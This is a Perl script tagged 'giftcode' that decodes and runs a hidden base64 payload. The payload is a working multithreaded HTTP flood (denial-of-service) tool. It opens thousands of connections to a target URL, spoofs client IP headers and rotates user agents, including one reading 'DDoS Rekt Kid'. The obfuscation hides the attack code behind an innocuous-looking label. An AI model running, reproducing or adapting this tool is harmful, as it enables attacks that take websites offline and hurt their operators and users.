#!/usr/bin/perl
#giftcode
use
MIME::Base64;
eval(decode_base64('IyEvdXNyL2Jpbi9wZXJsCnBhY2thZ2UgY29udHJvbDsKCm15ICRpcDsKCgpzdWIgbmV3IHsKICAgIG15ICgkY2xhc3MsJGkpID0gQF87CiAgICAkaXAgPSAkaTsKICAgIG15ICRzZWxmPXt9OwogICAgJGlwID0gJGk7CiAgICBibGVzcyAkc2VsZiwgJGNsYXNzOwogICAgcmV0dXJuICRzZWxmOwp9CgpzdWIgbWFzIHsKbXkgKCRzZWxmLCR2ZWNlcykgPSBAXzsKJHZlY2VzID0gMSBpZigkdmVjZXMgZXEgIiIpOwpteSAoJGEsJGUsJG8sJGIpID0gc3BsaXQoL1wuLywkaXApOwpmb3IoJGFzPTA7JGFzPCR2ZWNlczskYXMrKykgewokYisrOwppZigkYj49MjU1KSB7JGI9MDskbysrO30KaWYoJG8+PTI1NSkgeyRvPTA7JGUrKzt9CmlmKCRlPj0yNTUpIHskZT0wOyRhKys7fQpkaWUoIk5vIG1hcyBJUHMhXG4iKSBpZigkYT49MjU1KTsKfQokaXAgPSBqb2luICIiLCRhLCIuIiwkZSwiLiIsJG8sIi4iLCRiOwpyZXR1cm4gJGlwOwp9CgoxOwoKcGFja2FnZSBtYWluOwoKdXNlIFNvY2tldDsKdXNlIElPOjpTb2NrZXQ6OklORVQ7CnVzZSB0aHJlYWRzICgneWllbGQnLAogICAgICAgICAgICAgICAgJ2V4aXQnID0+ICd0aHJlYWRzX29ubHknLAogICAgICAgICAgICAgICAgJ3N0cmluZ2lmeScpOwp1c2UgdGhyZWFkczo6c2hhcmVkOwoKbXkgJHVhID0gIk1vemlsbGEvNS4wIChYMTE7IEREb1MgUmVrdCBLaWQ7IHJ2OjUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC81LjAiOwpteSAkdWEgPSAiTW96aWxsYS80LjAgKENvbXBhdGlibGU7IE1TSUUgOC4wOyBXaW5kb3dzIE5UIDUuMjsgVHJpZGVudC82LjApIjsKbXkgJHVhID0gIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDEwLjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMCkiOwpteSAkdWEgPSAiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgOC4wOyBXaW5kb3dzIE5UIDUuMTsgcGwpIE9wZXJhIDExLjAwIjsKbXkgJHVhID0gIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDguMDsgV2luZG93cyBOVCA2LjA7IGVuKSBPcGVyYSAxMS4wMCI7Cm15ICR1YSA9ICJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA4LjA7IFdpbmRvd3MgTlQgNi4wOyBqYSkgT3BlcmEgMTEuMDAiOwpteSAkdWEgPSAiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgOC4wOyBXaW5kb3dzIE5UIDYuMTsgZGUpIE9wZXJhIDExLjAxIjsKbXkgJG1ldGhvZCA9ICJHRVQiOwpteSAkaGlsbzsKbXkgQHZhbHMgPSAoJ2EnLCdiJywnYycsJ2QnLCdlJywnZicsJ2cnLCdoJywnaScsJ2onLCdrJywnbCcsJ24nLCdvJywncCcsJ3EnLCdyJywncycsJ3QnLCd1JywndycsJ3gnLCd5JywneicsMCwxLDIsMyw0LDUsNiw3LDgsOSk7Cm15ICRyYW5kc2VtaWxsYSA9ICIiOwpmb3IoJGkgPSAwOyAkaSA8IDMwOyAkaSsrKSB7CiAgICAkcmFuZHNlbWlsbGEgLj0gJHZhbHNbaW50KHJhbmQoJCN2YWxzKSldOwp9CnN1YiBzb2NrZXIgewogICAgbXkgKCRyZW1vdGUsJHBvcnQpID0gQF87CiAgICBteSAoJGlhZGRyLCAkcGFkZHIsICRwcm90byk7CiAgICAkaWFkZHIgPSBpbmV0X2F0b24oJHJlbW90ZSkgfHwgcmV0dXJuIGZhbHNlOwogICAgJHBhZGRyID0gc29ja2FkZHJfaW4oJHBvcnQsICRpYWRkcikgfHwgcmV0dXJuIGZhbHNlOwogICAgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpOwogICAgc29ja2V0KFNPQ0ssIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pOwogICAgY29ubmVjdChTT0NLLCAkcGFkZHIpIHx8IHJldHVybiBmYWxzZTsKICAgIHJldHVybiBTT0NLOwp9CgoKc3ViIHNlbmRlciB7CiAgICBteSAoJG1heCwkcGVlcnRvLCRob3N0LCRmaWxlKSA9IEBfOwogICAgbXkgJHNvY2s7CiAgICB3aGlsZSh0cnVlKSB7CiAgICAgICAgbXkgJHBhY2tldCA9ICIiOwogICAgICAgICRzb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFBlZXJBZGRyID0+ICRob3N0LCBQZWVyUG9ydCA9PiAkcGVlcnRvLCBQcm90byA9PiAndGNwJyk7CiAgICAgICAgdW5sZXNzKCRzb2NrKSB7CiAgICAgICAgICAgIHByaW50ICJcblt4XSBVbmFibGUgdG8gY29ubmVjdC4uLlxuXG4iOwogICAgICAgICAgICBzbGVlcCgxKTsKICAgICAgICAgICAgbmV4dDsKICAgICAgICB9CiAgICAgICAgZm9yKCRpPTA7JGk8JHBvcmNvbmV4aW9uOyRpKyspIHsKICAgICAgICAgICAgJGlwaW5pY2lhbCA9ICRzdW1hZG9yLT5tYXMoKTsKICAgICAgICAgICAgbXkgJGZpbGVwYXRoID0gJGZpbGU7CiAgICAgICAgICAgICRmaWxlcGF0aCA9fiBzLyhce21uXC1mYWtlaXBcfSkvJGlwaW5pY2lhbC9nOwogICAgICAgICAgICAkcGFja2V0IC49IGpvaW4gIiIsJG1ldGhvZCwiIC8iLCRmaWxlcGF0aCwiIEhUVFAvMS4xXHJcbkhvc3Q6ICIsJGhvc3QsIlxyXG5Vc2VyLUFnZW50OiAiLCR1YSwiXHJcbkNMSUVOVC1JUDogIiwkaXBpbmljaWFsLCJcclxuWC1Gb3J3YXJkZWQtRm9yOiAiLCRpcGluaWNpYWwsIlxyXG5JZi1Ob25lLU1hdGNoOiAiLCRyYW5kc2VtaWxsYSwiXHJcbklmLU1vZGlmaWVkLVNpbmNlOiBGcmksIDEgRGVjIDE5NjkgMjM6MDA6MDAgR01UXHJcbkFjY2VwdDogKi8qXHJcbkFjY2VwdC1MYW5ndWFnZTogZXMtZXMsZXM7cT0wLjgsZW4tdXM7cT0wLjUsZW47cT0wLjNcclxuQWNjZXB0LUVuY29kaW5nOiBnemlwLGRlZmxhdGVcclxuQWNjZXB0LUNoYXJzZXQ6IElTTy04ODU5LTEsdXRmLTg7cT0wLjcsKjtxPTAuN1xyXG5Db250ZW50LUxlbmd0aDogMFxyXG5Db25uZWN0aW9uOiBLZWVwLUFsaXZlXHJcblxyXG4iOwogICAgICAgIH0KICAgICAgICAkcGFja2V0ID1+IHMvQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG5cclxuJC9Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuLzsKICAgICAgICBwcmludCAkc29jayAkcGFja2V0OwogICAgfQp9CgpzdWIgc2VuZGVyMiB7CiAgICBteSAoJHBlZXJ0bywkaG9zdCwkcGFja2V0KSA9IEBfOwogICAgbXkgJHNvY2s7CiAgICBteSAkc3VtYWRvciA6c2hhcmVkOwogICAgd2hpbGUodHJ1ZSkgewogICAgICAgICRzb2NrID0gJnNvY2tlcigkaG9zdCwkcGVlcnRvKTsKICAgICAgICB1bmxlc3MoJHNvY2spIHsKICAgICAgICAgICAgcHJpbnQgIlxuW3hdIFVuYWJsZSB0byBjb25uZWN0Li4uXG5cbiI7CiAgICAgICAgICAgIG5leHQ7CiAgICAgICAgfQogICAgICAgIHByaW50ICRzb2NrICRwYWNrZXQ7CiAgICB9Cn0KCnN1YiBsYXllcjcgewogICAgJFNJR3snS0lMTCd9ID0gc3ViIHsgcHJpbnQgIktpbGxlZC4uLlxuIjsgdGhyZWFkcy0+ZXhpdCgpOyB9OwogICAgJHVybCA9ICRBUkdWWzBdOwogICAgcHJpbnQgIk9wZW5pbmcgU29ja2V0c1xuIjsKICAgICRtYXggPSAkQVJHVlsxXTsKICAgICRwb3Jjb25leGlvbiA9ICRBUkdWWzJdOwogICAgJGlwZmFrZSA9ICRBUkdWWzNdOwogICAgaWYoJHBvcmNvbmV4aW9uIDwgMSkgewogICAgICAgIHByaW50ICJbLV1JbnZhbGlkIGFyZyAzLi4uXG4iOwogICAgICAgIGV4aXQ7CiAgICB9CiAgICBpZigkdXJsICF+IC9eaHR0cDpcL1wvLykgewogICAgICAgIGRpZSgiW3hdIEludmFsaWQgVVJMIVxuIik7CiAgICB9CiAgICAkdXJsIC49ICIvIiBpZigkdXJsID1+IC9eaHR0cD86XC9cLyhbXGRcd1w6XC4tXSopJC8pOwogICAgKCRob3N0LCRmaWxlKSA9ICgkdXJsID1+IC9eaHR0cD86XC9cLyguKj8pXC8oLiopLyk7CiAgICAkcGVlcnRvID0gODA7CiAgICAoJGhvc3QsJHBlZXJ0bykgPSAoJGhvc3QgPX4gLyguKj8pOiguKikvKSBpZigkaG9zdCA9fiAvKC4qPyk6KC4qKS8pOwogICAgJGZpbGUgPX4gcy9ccy8gL2c7CiAgICBwcmludCBqb2luICIiLCJBdHRhY2sgU2VudFxuIjsKICAgICRmaWxlID0gIi8iLiRmaWxlIGlmKCRmaWxlICF+IC9eXC8vKTsKICAgIHByaW50IGpvaW4gIiIsIiI7CiAgICBpZigkaXBmYWtlIGVxICIiKSB7CiAgICAgICAgbXkgJHBhY2tldGJhc2UgPSBqb2luICIiLCRtZXRob2QsIiAvIiwkZmlsZSwiIEhUVFAvMS4xXHJcbkhvc3Q6ICIsJGhvc3QsIlxyXG5Vc2VyLUFnZW50OiAiLCR1YSwiXHJcbklmLU5vbmUtTWF0Y2g6ICIsJHJhbmRzZW1pbGxhLCJcclxuSWYtTW9kaWZpZWQtU2luY2U6IEZyaSwgMSBEZWMgMTk2OSAyMzowMDowMCBHTVRcclxuQWNjZXB0OiAqLypcclxuQWNjZXB0LUxhbmd1YWdlOiBlcy1lcyxlcztxPTAuOCxlbi11cztxPTAuNSxlbjtxPTAuM1xyXG5BY2NlcHQtRW5jb2Rpbmc6IGd6aXAsZGVmbGF0ZVxyXG5BY2NlcHQtQ2hhcnNldDogSVNPLTg4NTktMSx1dGYtODtxPTAuNywqO3E9MC43XHJcbkNvbnRlbnQtTGVuZ3RoOiAwXHJcbkNvbm5lY3Rpb246IEtlZXAtQWxpdmVcclxuXHJcbiI7CiAgICAgICAgJHBhY2tldHNlbmRlciA9ICIiOwogICAgICAgICRwYWNrZXRzZW5kZXIgPSAkcGFja2V0YmFzZSB4ICRwb3Jjb25leGlvbjsKICAgICAgICAkcGFja2V0c2VuZGVyID1+IHMvQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG5cclxuJC9Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuLzsKICAgICAgICBmb3IoJHY9MDskdjwkbWF4OyR2KyspIHsKICAgICAgICAgICAgJHRoclskdl0gPSB0aHJlYWRzLT5jcmVhdGUoJ3NlbmRlcjInLCAoJHBlZXJ0bywkaG9zdCwkcGFja2V0c2VuZGVyKSk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICAkc3VtYWRvciA9IGNvbnRyb2wtPm5ldygkaXBmYWtlKTsKICAgICAgICBmb3IoJHY9MDskdjwkbWF4OyR2KyspIHsKICAgICAgICAgICAgJHRoclskdl0gPSB0aHJlYWRzLT5jcmVhdGUoJ3NlbmRlcicsICgkcG9yY29uZXhpb24sJHBlZXJ0bywkaG9zdCwkZmlsZSkpOwogICAgICAgIH0KICAgIH0KICAgIHByaW50ICJbLV0gTGF1bmNoZWQhXG4iOwogICAgZm9yKCR2PTA7JHY8JG1heDskdisrKSB7CiAgICAgICAgaWYgKCR0aHJbJHZdLT5pc19ydW5uaW5nKCkpIHsKICAgICAgICAgICAgc2xlZXAoNSk7CiAgICAgICAgICAgICR2LS07CiAgICAgICAgfQogICAgfQogICAgcHJpbnQgIlshXSBGaW5pc2hlZCFcbiI7Cn0KCgppZigkI0FSR1YgPiAyKSB7CiAgICBsYXllcjcoKTsKfSBlbHNlIHsKICAgIGRpZSgiVXNhZ2U6IGh0dHAucGwgPHVybD4gPDEwMDAwPiA8NTA+IDwxMDA+XG4iKTsKfQ=='));
